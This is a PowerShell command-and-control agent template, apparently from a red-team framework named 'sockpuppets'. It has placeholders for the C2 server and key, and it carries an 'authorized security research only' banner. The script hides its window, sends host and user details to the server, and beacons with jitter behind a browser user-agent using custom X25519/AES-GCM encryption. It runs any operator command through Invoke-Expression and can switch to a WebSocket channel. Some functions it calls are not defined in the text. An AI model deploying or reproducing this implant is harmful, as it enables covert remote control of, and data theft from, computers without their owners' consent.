# PowerShell HTTP/HTTPS C2 Agent - For authorized security research only
$C2_HOST = "{{C2_HOST}}"
$C2_PORT = {{C2_PORT}}
$C2_SCHEME = "{{C2_SCHEME}}"
$RECONNECT_DELAY = 5
$BEACON_INTERVAL = {{BEACON_INTERVAL}}
$BEACON_JITTER = {{BEACON_JITTER}}
$VERIFY_SSL = ${{VERIFY_SSL}}

$BASE_URL = "${C2_SCHEME}://${C2_HOST}:${C2_PORT}"

$script:SERVER_PUB_HEX = '{{SERVER_PUB}}'
$script:EphPriv = $null
$script:HsKey = $null
$script:SessionKey = $null

function X25519-ScalarMult {
    param([byte[]]$K, [byte[]]$U)
    $kc = [byte[]]$K.Clone()
    $kc[0] = $kc[0] -band 248
    $kc[31] = ($kc[31] -band 127) -bor 64
    $P = [System.Numerics.BigInteger]::Pow(2, 255) - 19
    $A24 = [System.Numerics.BigInteger]121665
    $ub = New-Object byte[] 33
    [Array]::Copy($U, $ub, 32)
    $uBI = New-Object System.Numerics.BigInteger($ub, $true, $false)
    $x1 = $uBI; $x2 = [System.Numerics.BigInteger]::One; $z2 = [System.Numerics.BigInteger]::Zero
    $x3 = $uBI; $z3 = [System.Numerics.BigInteger]::One; $swap = 0
    $Mod = { param($v) $r = [System.Numerics.BigInteger]::Remainder($v, $P); if ($r -lt 0) { $r + $P } else { $r } }
    for ($t = 254; $t -ge 0; $t--) {
        $kt = ($kc[$t -shr 3] -shr ($t -band 7)) -band 1
        $swap = $swap -bxor $kt
        if ($swap -ne 0) { $tmp=$x2;$x2=$x3;$x3=$tmp; $tmp=$z2;$z2=$z3;$z3=$tmp }
        $swap = $kt
        $A = (& $Mod ($x2 + $z2)); $AA = (& $Mod ($A * $A))
        $B = (& $Mod ($x2 - $z2)); $BB = (& $Mod ($B * $B))
        $E = (& $Mod ($AA - $BB))
        $C = (& $Mod ($x3 + $z3)); $D = (& $Mod ($x3 - $z3))
        $DA = (& $Mod ($D * $A)); $CB = (& $Mod ($C * $B))
        $x3 = (& $Mod ((& $Mod ($DA + $CB)) * (& $Mod ($DA + $CB))))
        $z3 = (& $Mod ($x1 * (& $Mod ((& $Mod ($DA - $CB)) * (& $Mod ($DA - $CB))))))
        $x2 = (& $Mod ($AA * $BB))
        $z2 = (& $Mod ($E * (& $Mod ($AA + $A24 * $E))))
    }
    if ($swap -ne 0) { $tmp=$x2;$x2=$x3;$x3=$tmp; $tmp=$z2;$z2=$z3;$z3=$tmp }
    $inv = [System.Numerics.BigInteger]::ModPow($z2, $P - 2, $P)
    $result = (& $Mod ($x2 * $inv))
    $rb = $result.ToByteArray($true, $false)
    $out = New-Object byte[] 32
    [Array]::Copy($rb, $out, [Math]::Min($rb.Length, 32))
    return $out
}

function X25519-Basepoint { return ,([byte[]]@(9)+([byte[]]::new(31))) }

function Invoke-HKDF {
    param([byte[]]$IKM, [byte[]]$Info)
    $salt = [Text.Encoding]::UTF8.GetBytes('sockpuppets-salt-v1')
    $hmac1 = New-Object Security.Cryptography.HMACSHA256(,$salt)
    $prk = $hmac1.ComputeHash($IKM)
    $hmac2 = New-Object Security.Cryptography.HMACSHA256(,$prk)
    $t = New-Object byte[] ($Info.Length + 1)
    [Array]::Copy($Info, $t, $Info.Length)
    $t[$Info.Length] = 1
    $okm = $hmac2.ComputeHash($t)
    return $okm[0..31]
}

function Invoke-AesGcmSeal {
    param([byte[]]$Key, [string]$Plain)
    $nonce = New-Object byte[] 12
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
    $aes = [Security.Cryptography.AesGcm]::new($Key)
    $pt = [Text.Encoding]::UTF8.GetBytes($Plain)
    $ct = New-Object byte[] $pt.Length
    $tag = New-Object byte[] 16
    $aes.Encrypt($nonce, $pt, $ct, $tag)
    $out = New-Object byte[] (12 + $ct.Length + 16)
    [Array]::Copy($nonce, 0, $out, 0, 12)
    [Array]::Copy($ct, 0, $out, 12, $ct.Length)
    [Array]::Copy($tag, 0, $out, 12+$ct.Length, 16)
    return ,$out
}

function Invoke-AesGcmOpen {
    param([byte[]]$Key, [byte[]]$Blob)
    $nonce = $Blob[0..11]; $ct = $Blob[12..($Blob.Length-17)]; $tag = $Blob[($Blob.Length-16)..($Blob.Length-1)]
    $aes = [Security.Cryptography.AesGcm]::new($Key)
    $pt = New-Object byte[] $ct.Length
    $aes.Decrypt($nonce, $ct, $tag, $pt)
    return [Text.Encoding]::UTF8.GetString($pt)
}

function Invoke-Eph1Encrypt {
    param([string]$Data)
    if ($script:SessionKey) {
        $sealed = Invoke-AesGcmSeal -Key $script:SessionKey -Plain $Data
        $result = New-Object byte[] (4 + $sealed.Length)
        [Text.Encoding]::ASCII.GetBytes('AES1').CopyTo($result, 0)
        $sealed.CopyTo($result, 4)
        return [Convert]::ToBase64String($result)
    }
    $priv = New-Object byte[] 32
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($priv)
    $bp = X25519-Basepoint
    $pub = X25519-ScalarMult -K $priv -U $bp
    $serverPub = New-Object byte[] 32
    for ($i=0;$i -lt 32;$i++) { $serverPub[$i] = [Convert]::ToByte($script:SERVER_PUB_HEX.Substring($i*2,2),16) }
    $shared = X25519-ScalarMult -K $priv -U $serverPub
    $script:EphPriv = $priv
    $hsInfo = [Text.Encoding]::UTF8.GetBytes('sockpuppets-handshake-v1')
    $script:HsKey = Invoke-HKDF -IKM $shared -Info $hsInfo
    $sealed = Invoke-AesGcmSeal -Key $script:HsKey -Plain $Data
    $payload = New-Object byte[] (32 + $sealed.Length)
    $pub.CopyTo($payload, 0)
    $sealed.CopyTo($payload, 32)
    return "EPH1." + [Convert]::ToBase64String($payload)
}

function Invoke-Eph1Decrypt {
    param([string]$Data)
    if ($Data.StartsWith('EPH2.')) {
        $raw = [Convert]::FromBase64String($Data.Substring(5))
        $srvPub = $raw[0..31]
        $rest = $raw[32..($raw.Length-1)]
        $pt = Invoke-AesGcmOpen -Key $script:HsKey -Blob $rest
        $shared2 = X25519-ScalarMult -K $script:EphPriv -U $srvPub
        $combined = New-Object byte[] ($shared2.Length + $script:HsKey.Length)
        $shared2.CopyTo($combined, 0)
        $script:HsKey.CopyTo($combined, $shared2.Length)
        $sessInfo = [Text.Encoding]::UTF8.GetBytes('sockpuppets-session-v1')
        $script:SessionKey = Invoke-HKDF -IKM $combined -Info $sessInfo
        $script:EphPriv = $null; $script:HsKey = $null
        return $pt
    }
    if ($script:SessionKey) {
        $raw = [Convert]::FromBase64String($Data)
        if ([Text.Encoding]::ASCII.GetString($raw,0,4) -ne 'AES1') { throw 'ciphertext rejected' }
        return Invoke-AesGcmOpen -Key $script:SessionKey -Blob $raw[4..($raw.Length-1)]
    }
    throw 'no session key'
}

function Invoke-SleepEncrypt {
    param([int]$Seconds)
    $secret = [Text.Encoding]::UTF8.GetBytes('{{ENCRYPTION_KEY}}')
    $key = New-Object byte[] 16
    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
    for ($i = 0; $i -lt $secret.Length; $i++) { $secret[$i] = $secret[$i] -bxor $key[$i % 16] }
    Start-Sleep -Seconds $Seconds
    for ($i = 0; $i -lt $secret.Length; $i++) { $secret[$i] = $secret[$i] -bxor $key[$i % 16] }
}

function Invoke-SleepMask {
    param([int]$Seconds)
    $src = [Text.Encoding]::UTF8.GetBytes('sockpuppets-sleep-mask')
    try {
        $key = New-Object byte[] 32
        $nonce = New-Object byte[] 12
        $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($key)
        $rng.GetBytes($nonce)
        $tag = New-Object byte[] 16
        $ct = New-Object byte[] $src.Length
        $aes = [Security.Cryptography.AesGcm]::new($key)
        $aes.Encrypt($nonce, $src, $ct, $tag)
        Start-Sleep -Seconds $Seconds
        $out = New-Object byte[] $src.Length
        $aes.Decrypt($nonce, $ct, $tag, $out)
    } catch {
        Start-Sleep -Seconds $Seconds
    }
}

function Get-SystemMetadata {
    $metadata = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = "Windows"
        os_version = [System.Environment]::OSVersion.VersionString
        architecture = $env:PROCESSOR_ARCHITECTURE
        domain = $env:USERDOMAIN
        mode = "beacon"
        beacon_interval = $BEACON_INTERVAL
        beacon_jitter = $BEACON_JITTER
    }
    return $metadata
}

function Invoke-NativeLs {
    param([string]$Path = '.')
    if ([string]::IsNullOrEmpty($Path)) { $Path = '.' }
    try {
        $items = Get-ChildItem -Path $Path -Force -ErrorAction Stop
        $lines = @()
        foreach ($item in $items) {
            $prefix = if ($item.PSIsContainer) { 'd' } else { '-' }
            $size = if ($item.PSIsContainer) { '0' } else { $item.Length.ToString() }
            $lines += "$prefix $($size.PadLeft(12))  $($item.Name)"
        }
        if ($lines.Count -eq 0) { return "Directory is empty" }
        return ($lines -join "`n")
    } catch { return "Error: $($_.Exception.Message)" }
}

function Invoke-AgentCommand {
    param([string]$Command)
    if ($Command.StartsWith('__hd:')) { return (Invoke-HiddenDesktop $Command) }
    if ($Command -eq 'pwd') { return (Get-Location).Path }
    if ($Command -eq 'ls' -or $Command -eq 'dir') { return (Invoke-NativeLs '.') }
    if ($Command.StartsWith('ls ') -or $Command.StartsWith('dir ')) {
        return (Invoke-NativeLs ($Command.Substring($Command.IndexOf(' ') + 1).Trim()))
    }
    if ($Command.StartsWith('cat ') -or $Command.StartsWith('type ')) {
        try { return [System.IO.File]::ReadAllText($Command.Substring($Command.IndexOf(' ') + 1).Trim()) }
        catch { return "Error: $($_.Exception.Message)" }
    }
    if ($Command.StartsWith('cd ')) {
        try { Set-Location ($Command.Substring(3).Trim()); return "Changed directory to $((Get-Location).Path)" }
        catch { return "Error: $($_.Exception.Message)" }
    }
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($output)) {
            return "Command executed successfully (no output)"
        }
        return $output
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Send-HTTPRequest {
    param(
        [string]$Url,
        [string]$Body = $null,
        [string]$Method = "POST"
    )

    try {
        $headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            'Content-Type' = 'application/x-www-form-urlencoded'
            'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        $params = @{
            Uri = $Url
            Method = $Method
            Headers = $headers
            TimeoutSec = 60
            UseBasicParsing = $true
        }

        if (-not $VERIFY_SSL -and $C2_SCHEME -eq "https") {
            # Skip certificate validation for self-signed certs
            if ($PSVersionTable.PSVersion.Major -ge 6) {
                $params['SkipCertificateCheck'] = $true
            } else {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }
        }

        if ($Body) {
            $params['Body'] = $Body
        }

        $response = Invoke-WebRequest @params
        return $response.Content
    } catch {
        return ""
    }
}

function Get-SleepTime {
    param(
        [int]$BaseInterval,
        [int]$JitterPercent
    )
    if ($JitterPercent -le 0 -or $JitterPercent -gt 100) {
        return $BaseInterval
    }
    $jitterAmount = $BaseInterval * ($JitterPercent / 100.0)
    $minSleep = [Math]::Max(0, $BaseInterval - $jitterAmount)
    $maxSleep = $BaseInterval + $jitterAmount
    return Get-Random -Minimum $minSleep -Maximum ($maxSleep + 1)
}

function Start-Agent {
    $agentId = $null
    $pendingResults = @()
    $beaconInterval = $BEACON_INTERVAL
    $beaconJitter = $BEACON_JITTER

    while ($true) {
        try {
            # Register if needed
            if (-not $agentId) {
                $metadata = Get-SystemMetadata
                $registerMsg = @{
                    type = "register"
                    metadata = $metadata
                } | ConvertTo-Json -Compress -Depth 4

                $encrypted = Invoke-Eph1Encrypt -Data $registerMsg
                $response = Send-HTTPRequest -Url "$BASE_URL/submit-form" -Body $encrypted

                if ($response) {
                    $decrypted = Invoke-Eph1Decrypt -Data $response
                    $data = $decrypted | ConvertFrom-Json
                    if ($data.type -eq "registered" -or $data.type -eq "checkin_ack") {
                        $agentId = $data.agent_id
                    }
                }

                if (-not $agentId) {
                    Start-Sleep -Seconds $RECONNECT_DELAY
                    continue
                }
            }

            # Checkin with results
            $metadata = Get-SystemMetadata
            $checkinMsg = @{
                type = "checkin"
                agent_id = $agentId
                metadata = $metadata
                results = $pendingResults
            } | ConvertTo-Json -Compress -Depth 4

            $encrypted = Invoke-Eph1Encrypt -Data $checkinMsg
            $response = Send-HTTPRequest -Url "$BASE_URL/api/v1/update" -Body $encrypted
            $pendingResults = @()

            if ($response) {
                $decrypted = Invoke-Eph1Decrypt -Data $response
                $data = $decrypted | ConvertFrom-Json

                if ($data.type -eq "registered") {
                    $agentId = $data.agent_id
                    continue
                }

                if ($data.type -eq "commands" -and $data.commands) {
                    foreach ($cmdData in $data.commands) {
                        $command = $cmdData.command

                        # Handle internal commands
                        if ($command -like "__set_interval:*") {
                            try {
                                $beaconInterval = [int]($command -split ":")[1]
                            } catch {}
                            continue
                        }
                        if ($command -eq "__kill") {
                            exit
                        }
                        if ($command -like "__upgrade_ws:*") {
                            try {
                                $wsData = ($command -split ":", 2)[1] | ConvertFrom-Json
                                Start-WebSocketUpgrade -AgentId $agentId -WsHost $wsData.ws_host -WsPort $wsData.ws_port
                                return
                            } catch {
                                $pendingResults += @{
                                    type = "response"
                                    output = "WebSocket upgrade failed"
                                    command = "upgrade_ws"
                                    timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
                                }
                            }
                            continue
                        }

                        if ($command) {
                            $output = Invoke-AgentCommand -Command $command
                            $pendingResults += @{
                                type = "response"
                                output = $output
                                command = $command
                                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
                            }
                        }
                    }
                }
            }

            # Sleep with jitter
            $sleepTime = Get-SleepTime -BaseInterval $beaconInterval -JitterPercent $beaconJitter
            Invoke-SleepEncrypt -Seconds $sleepTime

        } catch {
            Start-Sleep -Seconds $RECONNECT_DELAY
        }
    }
}

function Start-WebSocketUpgrade {
    param(
        [string]$AgentId,
        [string]$WsHost,
        [int]$WsPort
    )

    try {
        $uri = "ws://${WsHost}:${WsPort}"
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ct = New-Object System.Threading.CancellationToken

        $task = $ws.ConnectAsync($uri, $ct)
        while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

        # Checkin with existing agent_id
        $metadata = Get-SystemMetadata
        $checkinMsg = @{
            type = "checkin"
            agent_id = $AgentId
            metadata = $metadata
        } | ConvertTo-Json -Compress -Depth 4

        $encrypted = Invoke-XOREncryption -Data $checkinMsg
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
        $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
        $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
        while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

        # Receive loop
        $buffer = New-Object byte[] 65536
        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
            $task = $ws.ReceiveAsync($segment, $ct)
            while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }

            if ($task.Result.Count -gt 0) {
                $received = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $task.Result.Count)
                $decrypted = Invoke-XORDecryption -Data $received
                $data = $decrypted | ConvertFrom-Json

                if ($data.type -eq "command") {
                    $output = Invoke-AgentCommand -Command $data.command
                    $response = @{
                        type = "response"
                        output = $output
                    } | ConvertTo-Json -Compress
                    $encrypted = Invoke-XOREncryption -Data $response
                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
                    $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
                    $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
                    while (-not $task.IsCompleted) { Start-Sleep -Milliseconds 100 }
                }
                elseif ($data.type -eq "kill") {
                    $ws.Dispose()
                    exit
                }
            }
        }
        $ws.Dispose()
    } catch {
        # Upgrade failed, fall back to HTTP
    }
}

# Hide PowerShell window
$windowcode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
try {
    Add-Type -MemberDefinition $windowcode -Name "Win32ShowWindowAsync" -Namespace Win32Functions
    $hwnd = (Get-Process -PID $PID).MainWindowHandle
    [Win32Functions.Win32ShowWindowAsync]::ShowWindow($hwnd, 0) | Out-Null
} catch {}

Start-Agent
